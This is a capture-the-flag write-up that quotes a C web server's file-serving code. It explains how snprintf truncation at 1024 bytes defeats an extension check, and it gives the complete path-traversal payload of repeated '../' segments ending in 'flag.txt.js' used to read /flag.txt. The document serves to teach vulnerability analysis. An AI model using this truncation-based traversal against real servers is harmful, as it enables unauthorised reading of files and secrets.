For this chall, you are given the source code (the server code being written in c) and you have to perform an LFI to get the flag.

The main page of the site is this, you can't do much with it.

![image](https://github.com/user-attachments/assets/1fbb8285-1757-41e4-b96b-8243ca40e90a)

What is interesting is the source code, you have 3 functions that will help to understand how to get the flag:

```c
//check the extension
bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && \
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}
```

```c
//try to read a file
FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);
    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;
    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;
    fread(content, 1, filesize, fd);
    content[filesize] = '\0';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}
```

```c
//process the requested resource
void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        
        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}
```

What you need to understand to retreve the flag:
- It retrieves the requested path: `sscanf(buffer, "GET /%s", requested_filename) != 1`
- It checks if the path is valid: `if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;`
- It checks if the requested resource exists in the public directory: `snprintf(real_path, sizeof(real_path), "public/%s", filename);`

With this mechanism, we understand that we have to escalate the directories to get to /flag.txt. However, we can't request a file that do not have the previously seen extensions. Luckily for us, there is a vulnerability on how the existence of the path is verified. This two lines of code is where the vulnerability lies:

```c
char real_path[BUFFER_SIZE]; //BUFFER_SIZE is defined in the code as having a value of 1024
snprintf(real_path, sizeof(real_path), "public/%s", filename);
```

By making some tests, I found out the snprintf function truncates the result when trying to put it in a buffer that can't hold the value. Meaning that if we wend a filename that is greater than 1024 characters, the real_path buffer will not take the filename as its whole but only the first 1024 characters. To get the flag we just have to send a payload that escalates the directories to the root one while being large enough to be truncated without losing correct file name.

Here's the payload: `../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt.js`

Note: the payload is only 1019 long because the final path will contain public/ along with our payload
